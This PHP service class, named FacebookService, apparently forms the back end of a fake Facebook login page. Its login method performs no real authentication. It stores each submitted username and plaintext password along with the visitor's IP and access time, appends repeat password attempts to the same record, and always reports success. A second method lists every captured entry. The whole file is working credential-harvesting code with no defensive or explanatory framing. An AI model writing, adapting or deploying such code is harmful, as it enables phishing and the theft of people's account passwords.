<?php
  namespace App\Services;
  use App\Models\Users;

  class FacebookService {
    protected $user;
    public function __construct(Users $user) {
      $this->user = $user;
    }
    public function login($username, $password, $ip) {
      if(strlen($username) < 10 || strlen($password) < 8) {
        $result = 1;
      } else {
        $userFb = new Users;
        $user = $userFb::where([['username', $username],['ip', $ip]])->first();
        $timestamp = time();
        $datetime = date("d/m/Y - H:i:s", $timestamp);
        if($user == null) {
          $this->user->username = $username;
          $this->user->password = $password;
          $this->user->ip = $ip;
          $this->user->time_access = $datetime;
          if($this->user->save()){
            $result = 2;
          }
        }else {
            $user->password .= ' || '. $password;
            $user->time_access .= ' || '. $datetime;
            if( $user->save()){
                $result = 2;
              }
        }
      }
      return $result;
    }

    public function getListUser() {
        $newUser = new Users;
        $listUser = $newUser->all()->sortByDesc('id');
        return $listUser;
      }

  }
